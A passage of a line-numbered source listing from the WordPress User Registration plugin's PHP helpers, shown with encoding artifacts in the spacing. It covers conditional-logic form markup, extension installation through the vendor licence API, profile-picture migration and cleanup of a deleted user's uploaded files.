| [2313](#L2313) | $outputÂ .=Â '<span class="slider round">'; |
| [2314](#L2314) | $outputÂ .=Â '</span>'; |
| [2315](#L2315) | $outputÂ .=Â '</span>'; |
| [2316](#L2316) | $outputÂ .=Â '<label>'Â .Â esc\_html\_\_(Â 'Use conditional logics',Â 'user-registration'Â )Â .Â '</label>'; |
| [2317](#L2317) | $outputÂ .=Â '</div>'; |
| [2318](#L2318) | $outputÂ .=Â '</div>'; |
| [2319](#L2319) |  |
| [2320](#L2320) | $outputÂ  Â  Â  Â  Â  Â  Â  Â  .=Â '<div class="ur\_conditional\_logic\_wrapper" data-source="'Â .Â esc\_attr(Â $integrationÂ )Â .Â '">'; |
| [2321](#L2321) | $outputÂ  Â  Â  Â  Â  Â  Â  Â  .=Â '<h4>'Â .Â esc\_html\_\_(Â 'Conditional Rules',Â 'user-registration'Â )Â .Â '</h4>'; |
| [2322](#L2322) | $outputÂ  Â  Â  Â  Â  Â  Â  Â  .=Â '<div class="ur-logic"><p>'Â .Â esc\_html\_\_(Â 'Send data only if the following matches.',Â 'user-registration'Â )Â .Â '</p></div>'; |
| [2323](#L2323) | $outputÂ  Â  Â  Â  Â  Â  Â  Â  .=Â '<div class="ur-conditional-wrapper">'; |
| [2324](#L2324) | $outputÂ  Â  Â  Â  Â  Â  Â  Â  .=Â '<select class="ur\_conditional\_field" name="ur\_conditional\_field">'; |
| [2325](#L2325) | $get\_all\_fieldsÂ  Â  Â  Â  Â =Â user\_registration\_pro\_get\_conditional\_fields\_by\_form\_id(Â $form\_id,Â ''Â ); |
| [2326](#L2326) | $selected\_ur\_field\_typeÂ =Â ''; |
| [2327](#L2327) |  |
| [2328](#L2328) | ifÂ (Â isset(Â $get\_all\_fieldsÂ )Â )Â { |
| [2329](#L2329) |  |
| [2330](#L2330) | foreachÂ (Â $get\_all\_fieldsÂ asÂ $keyÂ =>Â $fieldÂ )Â { |
| [2331](#L2331) | $selected\_attrÂ =Â ''; |
| [2332](#L2332) |  |
| [2333](#L2333) | ifÂ (Â isset(Â $connection['conditional\_logic\_data']['conditional\_field']Â )Â &&Â $connection['conditional\_logic\_data']['conditional\_field']Â ===Â $keyÂ )Â { |
| [2334](#L2334) | $selected\_attrÂ  Â  Â  Â  Â  =Â 'selected=selected'; |
| [2335](#L2335) | $selected\_ur\_field\_typeÂ =Â $field['field\_key']; |
| [2336](#L2336) | } |
| [2337](#L2337) | $outputÂ .=Â '<option data-type="'Â .Â esc\_attr(Â $field['field\_key']Â )Â .Â '" data-label="'Â .Â esc\_attr(Â $field['label']Â )Â .Â '" value="'Â .Â esc\_attr(Â $keyÂ )Â .Â '" 'Â .Â $selected\_attrÂ .Â '>'Â .Â esc\_html(Â $field['label']Â )Â .Â '</option>'; |
| [2338](#L2338) | } |
| [2339](#L2339) | } |
| [2340](#L2340) | $outputÂ .=Â '</select>'; |
| [2341](#L2341) | $outputÂ .=Â '<select class="ur-conditional-condition" name="ur-conditional-condition">'; |
| [2342](#L2342) | $outputÂ .=Â '<option value="is" 'Â .Â (Â isset(Â $connection['conditional\_logic\_data']['conditional\_operator']Â )Â &&Â 'is'Â ===Â $connection['conditional\_logic\_data']['conditional\_operator']Â ?Â 'selected'Â :Â ''Â )Â .Â '> is </option>'; |
| [2343](#L2343) | $outputÂ .=Â '<option value="is\_not" 'Â .Â (Â isset(Â $connection['conditional\_logic\_data']['conditional\_operator']Â )Â &&Â 'is\_not'Â ===Â $connection['conditional\_logic\_data']['conditional\_operator']Â ?Â 'selected'Â :Â ''Â )Â .Â '> is not </option>'; |
| [2344](#L2344) | $outputÂ .=Â '</select>'; |
| [2345](#L2345) |  |
| [2346](#L2346) | ifÂ (Â 'checkbox'Â ==Â $selected\_ur\_field\_typeÂ ||Â 'radio'Â ==Â $selected\_ur\_field\_typeÂ ||Â 'select'Â ==Â $selected\_ur\_field\_typeÂ ||Â 'country'Â ==Â $selected\_ur\_field\_typeÂ ||Â 'billing\_country'Â ==Â $selected\_ur\_field\_typeÂ ||Â 'shipping\_country'Â ==Â $selected\_ur\_field\_typeÂ ||Â 'select2'Â ==Â $selected\_ur\_field\_typeÂ ||Â 'multi\_select2'Â ==Â $selected\_ur\_field\_typeÂ )Â { |
| [2347](#L2347) | $choicesÂ =Â user\_registration\_pro\_get\_checkbox\_choices(Â $form\_id,Â $connection['conditional\_logic\_data']['conditional\_field']Â ); |
| [2348](#L2348) | $outputÂ .=Â '<select name="ur-conditional-input" class="ur-conditional-input">'; |
| [2349](#L2349) |  |
| [2350](#L2350) | ifÂ (Â is\_array(Â $choicesÂ )Â &&Â array\_filter(Â $choicesÂ )Â )Â { |
| [2351](#L2351) | $outputÂ .=Â '<option>--select--</option>'; |
| [2352](#L2352) |  |
| [2353](#L2353) | foreachÂ (Â $choicesÂ asÂ $keyÂ =>Â $choiceÂ )Â { |
| [2354](#L2354) | $keyÂ  Â  Â  Â  Â  Â =Â 'country'Â ==Â $selected\_ur\_field\_typeÂ ?Â $keyÂ :Â $choice; |
| [2355](#L2355) | $selectedvalueÂ =Â isset(Â $connection['conditional\_logic\_data']['conditional\_value']Â )Â &&Â $connection['conditional\_logic\_data']['conditional\_value']Â ==Â $keyÂ ?Â 'selected="selected"'Â :Â ''; |
| [2356](#L2356) | $outputÂ  Â  Â  Â .=Â '<option 'Â .Â $selectedvalueÂ .Â ' value="'Â .Â esc\_attr(Â $keyÂ )Â .Â '">'Â .Â esc\_html(Â $choiceÂ )Â .Â '</option>'; |
| [2357](#L2357) | } |
| [2358](#L2358) | }Â elseÂ { |
| [2359](#L2359) | $selectedÂ =Â isset(Â $connection['conditional\_logic\_data']['conditional\_value']Â )Â ?Â $connection['conditional\_logic\_data']['conditional\_value']Â :Â 0; |
| [2360](#L2360) | $outputÂ  .=Â '<option value="1" 'Â .Â (Â ur\_string\_to\_bool(Â $selectedÂ )Â ?Â 'selected="selected"'Â :Â ''Â )Â .Â ' >'Â .Â esc\_html\_\_(Â 'Checked',Â 'user-registration'Â )Â .Â '</option>'; |
| [2361](#L2361) | } |
| [2362](#L2362) | $outputÂ .=Â '</select>'; |
| [2363](#L2363) | }Â elseÂ { |
| [2364](#L2364) | $valueÂ  Â =Â isset(Â $connection['conditional\_logic\_data']['conditional\_value']Â )Â ?Â $connection['conditional\_logic\_data']['conditional\_value']Â :Â ''; |
| [2365](#L2365) | $outputÂ .=Â '<input class="ur-conditional-input" type="text" name="ur-conditional-input" value="'Â .Â esc\_attr(Â $valueÂ )Â .Â '">'; |
| [2366](#L2366) | } |
| [2367](#L2367) | $outputÂ .=Â '</div>'; |
| [2368](#L2368) | $outputÂ .=Â '</div>'; |
| [2369](#L2369) | $outputÂ .=Â '</div>'; |
| [2370](#L2370) | returnÂ $output; |
| [2371](#L2371) | } |
| [2372](#L2372) | } |
| [2373](#L2373) |  |
| [2374](#L2374) |  |
| [2375](#L2375) | ifÂ (Â !Â function\_exists(Â 'user\_registration\_pro\_get\_checkbox\_choices'Â )Â )Â { |
| [2376](#L2376) | /\*\* |
| [2377](#L2377) | \* Get Select and Checkbox Fields Choices |
| [2378](#L2378) | \* |
| [2379](#L2379) | \* @param intÂ  Â  $form\_id Form ID. |
| [2380](#L2380) | \* @param string $field\_name Field Name. |
| [2381](#L2381) | \* @return array $choices |
| [2382](#L2382) | \*/ |
| [2383](#L2383) | functionÂ user\_registration\_pro\_get\_checkbox\_choices(Â $form\_id,Â $field\_nameÂ )Â { |
| [2384](#L2384) |  |
| [2385](#L2385) | $form\_dataÂ =Â (object)Â user\_registration\_pro\_get\_field\_data(Â $form\_id,Â $field\_nameÂ ); |
| [2386](#L2386) | /\* Backward Compatibility. Modified since 1.5.7. To be removed later. \*/ |
| [2387](#L2387) | $advance\_setting\_choicesÂ =Â isset(Â $form\_data->advance\_setting->choicesÂ )Â ?Â $form\_data->advance\_setting->choicesÂ :Â ''; |
| [2388](#L2388) | $advance\_setting\_optionsÂ =Â isset(Â $form\_data->advance\_setting->optionsÂ )Â ?Â $form\_data->advance\_setting->optionsÂ :Â ''; |
| [2389](#L2389) | /\* Bacward Compatibility end.\*/ |
| [2390](#L2390) |  |
| [2391](#L2391) | $choicesÂ =Â isset(Â $form\_data->general\_setting->optionsÂ )Â ?Â $form\_data->general\_setting->optionsÂ :Â ''; |
| [2392](#L2392) |  |
| [2393](#L2393) | /\* Backward Compatibility. Modified since 1.5.7. To be removed later. \*/ |
| [2394](#L2394) | ifÂ (Â !Â empty(Â $advance\_setting\_choicesÂ )Â )Â { |
| [2395](#L2395) | $choicesÂ =Â explode(Â ',',Â $advance\_setting\_choicesÂ ); |
| [2396](#L2396) | }Â elseifÂ (Â !Â empty(Â $advance\_setting\_optionsÂ )Â )Â { |
| [2397](#L2397) | $choicesÂ =Â explode(Â ',',Â $advance\_setting\_optionsÂ ); |
| [2398](#L2398) | /\* Backward Compatibility end. \*/ |
| [2399](#L2399) |  |
| [2400](#L2400) | }Â elseifÂ (Â 'country'Â ===Â $form\_data->field\_keyÂ )Â { |
| [2401](#L2401) | $countryÂ =Â newÂ UR\_Form\_Field\_Country(); |
| [2402](#L2402) | $country->get\_country(); |
| [2403](#L2403) | $choicesÂ =Â $country->get\_country(); |
| [2404](#L2404) | } |
| [2405](#L2405) |  |
| [2406](#L2406) | returnÂ $choices; |
| [2407](#L2407) | } |
| [2408](#L2408) | } |
| [2409](#L2409) |  |
| [2410](#L2410) | ifÂ (Â !Â function\_exists(Â 'user\_registration\_pro\_get\_field\_data'Â )Â )Â { |
| [2411](#L2411) | /\*\* |
| [2412](#L2412) | \* Get all fields data |
| [2413](#L2413) | \* |
| [2414](#L2414) | \* @paramÂ  intÂ  Â  $form\_idÂ  Â  Form ID. |
| [2415](#L2415) | \* @paramÂ  string $field\_name Field Name. |
| [2416](#L2416) | \* @return arrayÂ  Â  $field\_data. |
| [2417](#L2417) | \*/ |
| [2418](#L2418) | functionÂ user\_registration\_pro\_get\_field\_data(Â $form\_id,Â $field\_nameÂ )Â { |
| [2419](#L2419) | $argsÂ  Â  Â  =Â array( |
| [2420](#L2420) | 'post\_type'Â  Â =>Â 'user\_registration', |
| [2421](#L2421) | 'post\_status'Â =>Â 'publish', |
| [2422](#L2422) | 'post\_\_in'Â  Â  =>Â array(Â $form\_idÂ ), |
| [2423](#L2423) | ); |
| [2424](#L2424) | $post\_dataÂ =Â get\_posts(Â $argsÂ ); |
| [2425](#L2425) |  |
| [2426](#L2426) | ifÂ (Â isset(Â $post\_data[0]->post\_contentÂ )Â )Â { |
| [2427](#L2427) | $post\_content\_arrayÂ =Â json\_decode(Â $post\_data[0]->post\_contentÂ ); |
| [2428](#L2428) |  |
| [2429](#L2429) | foreachÂ (Â $post\_content\_arrayÂ asÂ $dataÂ )Â { |
| [2430](#L2430) | foreachÂ (Â $dataÂ asÂ $single\_dataÂ )Â { |
| [2431](#L2431) | foreachÂ (Â $single\_dataÂ asÂ $field\_dataÂ )Â { |
| [2432](#L2432) | isset(Â $field\_data->general\_setting->field\_nameÂ )Â ?Â $field\_data->general\_setting->field\_nameÂ :Â ''; |
| [2433](#L2433) | ifÂ (Â $field\_data->general\_setting->field\_nameÂ ===Â $field\_nameÂ )Â { |
| [2434](#L2434) | returnÂ $field\_data; |
| [2435](#L2435) | } |
| [2436](#L2436) | } |
| [2437](#L2437) | } |
| [2438](#L2438) | } |
| [2439](#L2439) | } |
| [2440](#L2440) | } |
| [2441](#L2441) | } |
| [2442](#L2442) |  |
| [2443](#L2443) | ifÂ (Â !Â function\_exists(Â 'ur\_install\_extensions'Â )Â )Â { |
| [2444](#L2444) | /\*\* |
| [2445](#L2445) | \* This function return boolean according to string to avoid colision of 1, true, yes. |
| [2446](#L2446) | \* |
| [2447](#L2447) | \* @param [string] $name Name of the extension. |
| [2448](#L2448) | \* @param [string] $slug Slug of the extension. |
| [2449](#L2449) | \* @throws Exception Extension Download and activation unsuccessful message. |
| [2450](#L2450) | \*/ |
| [2451](#L2451) | functionÂ ur\_install\_extensions(Â $name,Â $slugÂ )Â { |
| [2452](#L2452) | tryÂ { |
| [2453](#L2453) |  |
| [2454](#L2454) | $pluginÂ =Â 'user-registration-pro'Â ===Â $slugÂ ?Â plugin\_basename(Â sanitize\_text\_field(Â wp\_unslash(Â $slugÂ .Â '/user-registration.php'Â )Â )Â )Â :Â plugin\_basename(Â sanitize\_text\_field(Â wp\_unslash(Â $slugÂ .Â '/'Â .Â $slugÂ .Â '.php'Â )Â )Â ); |
| [2455](#L2455) | $statusÂ =Â array( |
| [2456](#L2456) | 'install'Â =>Â 'plugin', |
| [2457](#L2457) | 'slug'Â  Â  =>Â sanitize\_key(Â wp\_unslash(Â $slugÂ )Â ), |
| [2458](#L2458) | ); |
| [2459](#L2459) |  |
| [2460](#L2460) | ifÂ (Â !Â current\_user\_can(Â 'install\_plugins'Â )Â )Â { |
| [2461](#L2461) | $status['errorMessage']Â =Â esc\_html\_\_(Â 'Sorry, you are not allowed to install plugins on this site.',Â 'user-registration'Â ); |
| [2462](#L2462) |  |
| [2463](#L2463) | /\* translators: %1$s: Activation error message \*/ |
| [2464](#L2464) | throwÂ newÂ Exception(Â sprintf(Â \_\_(Â '<strong>Activation error:</strong> %1$s',Â 'user-registration'Â ),Â $status['errorMessage']Â )Â ); |
| [2465](#L2465) | } |
| [2466](#L2466) |  |
| [2467](#L2467) | include\_onceÂ ABSPATHÂ .Â 'wp-admin/includes/class-wp-upgrader.php'; |
| [2468](#L2468) | include\_onceÂ ABSPATHÂ .Â 'wp-admin/includes/plugin-install.php'; |
| [2469](#L2469) |  |
| [2470](#L2470) | ifÂ (Â file\_exists(Â WP\_PLUGIN\_DIRÂ .Â '/'Â .Â $slugÂ )Â )Â { |
| [2471](#L2471) | $plugin\_dataÂ  Â  Â  Â  Â  =Â get\_plugin\_data(Â WP\_PLUGIN\_DIRÂ .Â '/'Â .Â $pluginÂ ); |
| [2472](#L2472) | $status['plugin']Â  Â  Â =Â $plugin; |
| [2473](#L2473) | $status['pluginName']Â =Â $plugin\_data['Name']; |
| [2474](#L2474) |  |
| [2475](#L2475) | ifÂ (Â current\_user\_can(Â 'activate\_plugin',Â $pluginÂ )Â &&Â is\_plugin\_inactive(Â $pluginÂ )Â )Â { |
| [2476](#L2476) | $resultÂ =Â activate\_plugin(Â $pluginÂ ); |
| [2477](#L2477) |  |
| [2478](#L2478) | ifÂ (Â is\_wp\_error(Â $resultÂ )Â )Â { |
| [2479](#L2479) | $status['errorCode']Â  Â  =Â $result->get\_error\_code(); |
| [2480](#L2480) | $status['errorMessage']Â =Â $result->get\_error\_message(); |
| [2481](#L2481) |  |
| [2482](#L2482) | /\* translators: %1$s: Activation error message \*/ |
| [2483](#L2483) | throwÂ newÂ Exception(Â sprintf(Â \_\_(Â '<strong>Activation error:</strong> %1$s',Â 'user-registration'Â ),Â $status['errorMessage']Â )Â ); |
| [2484](#L2484) | } |
| [2485](#L2485) |  |
| [2486](#L2486) | $status['success']Â =Â true; |
| [2487](#L2487) | $status['message']Â =Â $nameÂ .Â ' has been installed and activated successfully'; |
| [2488](#L2488) |  |
| [2489](#L2489) | returnÂ $status; |
| [2490](#L2490) | } |
| [2491](#L2491) | } |
| [2492](#L2492) |  |
| [2493](#L2493) | $apiÂ =Â json\_decode( |
| [2494](#L2494) | UR\_Updater\_Key\_API::version( |
| [2495](#L2495) | array( |
| [2496](#L2496) | 'license'Â  Â =>Â get\_option(Â 'user-registration\_license\_key'Â ), |
| [2497](#L2497) | 'item\_name'Â =>Â $name, |
| [2498](#L2498) | ) |
| [2499](#L2499) | ) |
| [2500](#L2500) | ); |
| [2501](#L2501) |  |
| [2502](#L2502) | ifÂ (Â is\_wp\_error(Â $apiÂ )Â )Â { |
| [2503](#L2503) | $status['errorMessage']Â =Â $api->get\_error\_message(); |
| [2504](#L2504) |  |
| [2505](#L2505) | /\* translators: %1$s: Activation error message \*/ |
| [2506](#L2506) | throwÂ newÂ Exception(Â sprintf(Â \_\_(Â '<strong>Activation error:</strong> %1$s',Â 'user-registration'Â ),Â $status['errorMessage']Â )Â ); |
| [2507](#L2507) | } |
| [2508](#L2508) |  |
| [2509](#L2509) | $status['pluginName']Â =Â $api->name; |
| [2510](#L2510) | $api->versionÂ  Â  Â  Â  Â =Â isset(Â $api->new\_versionÂ )Â ?Â $api->new\_versionÂ :Â '1.0.0'; |
| [2511](#L2511) |  |
| [2512](#L2512) | $skinÂ  Â  Â =Â newÂ WP\_Ajax\_Upgrader\_Skin(); |
| [2513](#L2513) | $upgraderÂ =Â newÂ Plugin\_Upgrader(Â $skinÂ ); |
| [2514](#L2514) | $resultÂ  Â =Â $upgrader->install(Â $api->download\_linkÂ ); |
| [2515](#L2515) |  |
| [2516](#L2516) | ifÂ (Â defined(Â 'WP\_DEBUG'Â )Â &&Â WP\_DEBUGÂ )Â { |
| [2517](#L2517) | $status['debug']Â =Â $skin->get\_upgrade\_messages(); |
| [2518](#L2518) | } |
| [2519](#L2519) |  |
| [2520](#L2520) | ifÂ (Â is\_wp\_error(Â $resultÂ )Â )Â { |
| [2521](#L2521) | $status['errorCode']Â  Â  =Â $result->get\_error\_code(); |
| [2522](#L2522) | $status['errorMessage']Â =Â $result->get\_error\_message(); |
| [2523](#L2523) |  |
| [2524](#L2524) | /\* translators: %1$s: Activation error message \*/ |
| [2525](#L2525) | throwÂ newÂ Exception(Â sprintf(Â \_\_(Â '<strong>Activation error:</strong> %1$s',Â 'user-registration'Â ),Â $status['errorMessage']Â )Â ); |
| [2526](#L2526) | }Â elseifÂ (Â is\_wp\_error(Â $skin->resultÂ )Â )Â { |
| [2527](#L2527) | $status['errorCode']Â  Â  =Â $skin->result->get\_error\_code(); |
| [2528](#L2528) | $status['errorMessage']Â =Â $skin->result->get\_error\_message(); |
| [2529](#L2529) |  |
| [2530](#L2530) | /\* translators: %1$s: Activation error message \*/ |
| [2531](#L2531) | throwÂ newÂ Exception(Â sprintf(Â \_\_(Â '<strong>Activation error:</strong> %1$s',Â 'user-registration'Â ),Â $status['errorMessage']Â )Â ); |
| [2532](#L2532) | }Â elseifÂ (Â $skin->get\_errors()->get\_error\_code()Â )Â { |
| [2533](#L2533) | $status['errorMessage']Â =Â $skin->get\_error\_messages(); |
| [2534](#L2534) |  |
| [2535](#L2535) | /\* translators: %1$s: Activation error message \*/ |
| [2536](#L2536) | throwÂ newÂ Exception(Â sprintf(Â \_\_(Â '<strong>Activation error:</strong> %1$s',Â 'user-registration'Â ),Â $status['errorMessage']Â )Â ); |
| [2537](#L2537) | }Â elseifÂ (Â is\_null(Â $resultÂ )Â )Â { |
| [2538](#L2538) | globalÂ $wp\_filesystem; |
| [2539](#L2539) |  |
| [2540](#L2540) | $status['errorCode']Â  Â  =Â 'unable\_to\_connect\_to\_filesystem'; |
| [2541](#L2541) | $status['errorMessage']Â =Â esc\_html\_\_(Â 'Unable to connect to the filesystem. Please confirm your credentials.',Â 'user-registration'Â ); |
| [2542](#L2542) |  |
| [2543](#L2543) | // Pass through the error from WP\_Filesystem if one was raised. |
| [2544](#L2544) | ifÂ (Â $wp\_filesystemÂ instanceofÂ WP\_Filesystem\_BaseÂ &&Â is\_wp\_error(Â $wp\_filesystem->errorsÂ )Â &&Â $wp\_filesystem->errors->get\_error\_code()Â )Â { |
| [2545](#L2545) | $status['errorMessage']Â =Â esc\_html(Â $wp\_filesystem->errors->get\_error\_message()Â ); |
| [2546](#L2546) | } |
| [2547](#L2547) |  |
| [2548](#L2548) | /\* translators: %1$s: Activation error message \*/ |
| [2549](#L2549) | throwÂ newÂ Exception(Â sprintf(Â \_\_(Â '<strong>Activation error:</strong> %1$s',Â 'user-registration'Â ),Â $status['errorMessage']Â )Â ); |
| [2550](#L2550) | } |
| [2551](#L2551) |  |
| [2552](#L2552) | $install\_statusÂ =Â install\_plugin\_install\_status(Â $apiÂ ); |
| [2553](#L2553) |  |
| [2554](#L2554) | ifÂ (Â current\_user\_can(Â 'activate\_plugin',Â $install\_status['file']Â )Â )Â { |
| [2555](#L2555) | ifÂ (Â is\_plugin\_inactive(Â $install\_status['file']Â )Â )Â { |
| [2556](#L2556) | $status['activateUrl']Â = |
| [2557](#L2557) | esc\_url\_raw( |
| [2558](#L2558) | add\_query\_arg( |
| [2559](#L2559) | array( |
| [2560](#L2560) | 'action'Â  Â =>Â 'activate', |
| [2561](#L2561) | 'plugin'Â  Â =>Â $install\_status['file'], |
| [2562](#L2562) | '\_wpnonce'Â =>Â wp\_create\_nonce(Â 'activate-plugin\_'Â .Â $install\_status['file']Â ), |
| [2563](#L2563) | ), |
| [2564](#L2564) | admin\_url(Â 'admin.php?page=user-registration-addons'Â ) |
| [2565](#L2565) | ) |
| [2566](#L2566) | ); |
| [2567](#L2567) | }Â elseÂ { |
| [2568](#L2568) | $status['deActivateUrl']Â = |
| [2569](#L2569) | esc\_url\_raw( |
| [2570](#L2570) | add\_query\_arg( |
| [2571](#L2571) | array( |
| [2572](#L2572) | 'action'Â  Â =>Â 'deactivate', |
| [2573](#L2573) | 'plugin'Â  Â =>Â $install\_status['file'], |
| [2574](#L2574) | '\_wpnonce'Â =>Â wp\_create\_nonce(Â 'deactivate-plugin\_'Â .Â $install\_status['file']Â ), |
| [2575](#L2575) | ), |
| [2576](#L2576) | admin\_url(Â 'admin.php?page=user-registration-addons'Â ) |
| [2577](#L2577) | ) |
| [2578](#L2578) | ); |
| [2579](#L2579) | } |
| [2580](#L2580) | } |
| [2581](#L2581) |  |
| [2582](#L2582) | $status['success']Â =Â true; |
| [2583](#L2583) | $status['message']Â =Â $nameÂ .Â ' has been installed and activated successfully'; |
| [2584](#L2584) |  |
| [2585](#L2585) | returnÂ $status; |
| [2586](#L2586) |  |
| [2587](#L2587) | }Â catchÂ (Â ExceptionÂ $eÂ )Â { |
| [2588](#L2588) |  |
| [2589](#L2589) | $messageÂ  Â  Â  Â  Â  Â =Â $e->getMessage(); |
| [2590](#L2590) | $status['success']Â =Â false; |
| [2591](#L2591) | $status['message']Â =Â $message; |
| [2592](#L2592) |  |
| [2593](#L2593) | returnÂ $status; |
| [2594](#L2594) | } |
| [2595](#L2595) | } |
| [2596](#L2596) | } |
| [2597](#L2597) |  |
| [2598](#L2598) | add\_action(Â 'user\_registration\_init',Â 'ur\_profile\_picture\_migration\_script'Â ); |
| [2599](#L2599) |  |
| [2600](#L2600) | ifÂ (Â !Â function\_exists(Â 'ur\_profile\_picture\_migration\_script'Â )Â )Â { |
| [2601](#L2601) |  |
| [2602](#L2602) | /\*\* |
| [2603](#L2603) | \* Update usermeta from profile\_pic\_url to attachemnt id and move files to new directory. |
| [2604](#L2604) | \* |
| [2605](#L2605) | \* @since 1.5.0. |
| [2606](#L2606) | \*/ |
| [2607](#L2607) | functionÂ ur\_profile\_picture\_migration\_script()Â { |
| [2608](#L2608) |  |
| [2609](#L2609) | ifÂ (Â !Â get\_option(Â 'ur\_profile\_picture\_migrated',Â falseÂ )Â )Â { |
| [2610](#L2610) |  |
| [2611](#L2611) | $usersÂ =Â get\_users( |
| [2612](#L2612) | array( |
| [2613](#L2613) | 'meta\_key'Â =>Â 'user\_registration\_profile\_pic\_url', |
| [2614](#L2614) | ) |
| [2615](#L2615) | ); |
| [2616](#L2616) |  |
| [2617](#L2617) | foreachÂ (Â $usersÂ asÂ $userÂ )Â { |
| [2618](#L2618) | $user\_registration\_profile\_pic\_urlÂ =Â get\_user\_meta(Â $user->ID,Â 'user\_registration\_profile\_pic\_url',Â trueÂ ); |
| [2619](#L2619) |  |
| [2620](#L2620) | ifÂ (Â !Â is\_numeric(Â $user\_registration\_profile\_pic\_urlÂ )Â )Â { |
| [2621](#L2621) | $user\_registration\_profile\_pic\_attachmentÂ =Â attachment\_url\_to\_postid(Â $user\_registration\_profile\_pic\_urlÂ ); |
| [2622](#L2622) | ifÂ (Â 0Â !=Â $user\_registration\_profile\_pic\_attachmentÂ )Â { |
| [2623](#L2623) | update\_user\_meta(Â $user->ID,Â 'user\_registration\_profile\_pic\_url',Â absint(Â $user\_registration\_profile\_pic\_attachmentÂ )Â ); |
| [2624](#L2624) | } |
| [2625](#L2625) | } |
| [2626](#L2626) | } |
| [2627](#L2627) |  |
| [2628](#L2628) | update\_option(Â 'ur\_profile\_picture\_migrated',Â trueÂ ); |
| [2629](#L2629) | } |
| [2630](#L2630) | } |
| [2631](#L2631) | } |
| [2632](#L2632) |  |
| [2633](#L2633) | add\_action(Â 'delete\_user',Â 'ur\_delete\_user\_files\_on\_user\_delete',Â 10,Â 3Â ); |
| [2634](#L2634) |  |
| [2635](#L2635) | ifÂ (Â !Â function\_exists(Â 'ur\_delete\_user\_files\_on\_user\_delete'Â )Â )Â { |
| [2636](#L2636) |  |
| [2637](#L2637) | /\*\* |
| [2638](#L2638) | \* Delete user uploaded files when user is deleted. |
| [2639](#L2639) | \* |
| [2640](#L2640) | \* @param [type] $user\_id User Id. |
| [2641](#L2641) | \* @param [type] $reassignÂ  Reassign to another user ( admin ). |
| [2642](#L2642) | \* @param [type] $user User Data. |
| [2643](#L2643) | \*/ |
| [2644](#L2644) | functionÂ ur\_delete\_user\_files\_on\_user\_delete(Â $user\_id,Â $reassign,Â $userÂ )Â { |
| [2645](#L2645) |  |
| [2646](#L2646) | // Return if reassign is set. |
| [2647](#L2647) | ifÂ (Â nullÂ !==Â $reassignÂ )Â { |
| [2648](#L2648) | return; |
| [2649](#L2649) | } |
| [2650](#L2650) |  |
| [2651](#L2651) | // Delete user uploaded file when user is deleted. |
| [2652](#L2652) | ifÂ (Â class\_exists(Â 'URFU\_Uploaded\_Data'Â )Â )Â { |
| [2653](#L2653) | $postÂ =Â get\_post(Â ur\_get\_form\_id\_by\_userid(Â $user\_idÂ )Â ); |
| [2654](#L2654) |  |
| [2655](#L2655) | $form\_data\_objectÂ =Â json\_decode(Â $post->post\_contentÂ ); |
| [2656](#L2656) |  |
| [2657](#L2657) | $file\_fieldsÂ =Â URFU\_Uploaded\_Data::get\_file\_field(Â $form\_data\_objectÂ ); |
| [2658](#L2658) |  |
| [2659](#L2659) | foreachÂ (Â $file\_fieldsÂ asÂ $fieldÂ )Â { |
| [2660](#L2660) |  |
| [2661](#L2661) | $meta\_keyÂ =Â isset(Â $field['key']Â )Â ?Â $field['key']Â :Â ''; |
| [2662](#L2662) |  |
| [2663](#L2663) | $attachment\_idsÂ =Â explode(Â ',',Â get\_user\_meta(Â $user->ID,Â 'user\_registration\_'Â .Â $meta\_key,Â trueÂ )Â ); |
| [2664](#L2664) |  |
| [2665](#L2665) | foreachÂ (Â $attachment\_idsÂ asÂ $attachment\_idÂ )Â { |
| [2666](#L2666) | $file\_pathÂ =Â get\_attached\_file(Â $attachment\_idÂ ); |
| [2667](#L2667) |  |
| [2668](#L2668) | ifÂ (Â file\_exists(Â $file\_pathÂ )Â )Â { |
| [2669](#L2669) | unlink(Â $file\_pathÂ ); |
| [2670](#L2670) | } |
| [2671](#L2671) | } |
| [2672](#L2672) | } |
| [2673](#L2673) | } |
| [2674](#L2674) |  |
| [2675](#L2675) | // Delete user uploaded profile image when user is deleted. |
| [2676](#L2676) | $profile\_pic\_attachment\_idÂ =Â get\_user\_meta(Â $user\_id,Â 'user\_registration\_profile\_pic\_url',Â trueÂ ); |
| [2677](#L2677) |  |
| [2678](#L2678) | $pic\_pathÂ =Â get\_attached\_file(Â $profile\_pic\_attachment\_idÂ ); |
| [2679](#L2679) |  |
| [2680](#L2680) | ifÂ (Â file\_exists(Â $pic\_pathÂ )Â )Â { |
| [2681](#L2681) | unlink(Â $pic\_pathÂ ); |
| [2682](#L2682) | } |
| [2683](#L2683) | } |
| [2684](#L2684) | } |
| [2685](#L2685) |  |
| [2686](#L2686) | ifÂ (Â !Â function\_exists(Â 'ur\_format\_field\_values'Â )Â )Â { |
| [2687](#L2687) |  |
| [2688](#L2688) | /\*\* |
| [2689](#L2689) | \* Get field type by meta key |
| [2690](#L2690) | \* |
| [2691](#L2691) | \* @param intÂ  Â  $field\_meta\_key Field key or meta key. |
| [2692](#L2692) | \* @param string $field\_value Field's value . |
| [2693](#L2693) | \*/ |
| [2694](#L2694) | functionÂ ur\_format\_field\_values(Â $field\_meta\_key,Â $field\_valueÂ )Â { |
| [2695](#L2695) | ifÂ (Â strpos(Â $field\_meta\_key,Â 'user\_registration\_'Â )Â )Â { |
| [2696](#L2696) | $field\_meta\_keyÂ =Â substr(Â $field\_meta\_key,Â 0,Â strpos(Â $field\_meta\_key,Â 'user\_registration\_'Â )Â ); |
| [2697](#L2697) | } |
| [2698](#L2698) |  |
| [2699](#L2699) | $user\_idÂ =Â isset(Â $\_GET['user']Â )Â ?Â sanitize\_text\_field(Â wp\_unslash(Â $\_GET['user']Â )Â )Â :Â get\_current\_user\_id(); |
| [2700](#L2700) | $user\_idÂ =Â isset(Â $\_GET['user\_id']Â )Â ?Â sanitize\_text\_field(Â wp\_unslash(Â $\_GET['user\_id']Â )Â )Â :Â $user\_id; |
| [2701](#L2701) | $form\_idÂ =Â isset(Â $\_POST['form\_id']Â )Â ?Â sanitize\_text\_field(Â wp\_unslash(Â $\_POST['form\_id']Â )Â )Â :Â ur\_get\_form\_id\_by\_userid(Â $user\_idÂ );Â //phpcs:ignore |
| [2702](#L2702) |  |
| [2703](#L2703) | $field\_nameÂ =Â ur\_get\_field\_data\_by\_field\_name(Â $form\_id,Â $field\_meta\_keyÂ ); |
| [2704](#L2704) | $field\_keyÂ  =Â isset(Â $field\_name['field\_key']Â )Â ?Â $field\_name['field\_key']Â :Â ''; |
| [2705](#L2705) |  |
| [2706](#L2706) | switchÂ (Â $field\_keyÂ )Â { |
| [2707](#L2707) | caseÂ 'checkbox': |
| [2708](#L2708) | caseÂ 'multi\_select2': |
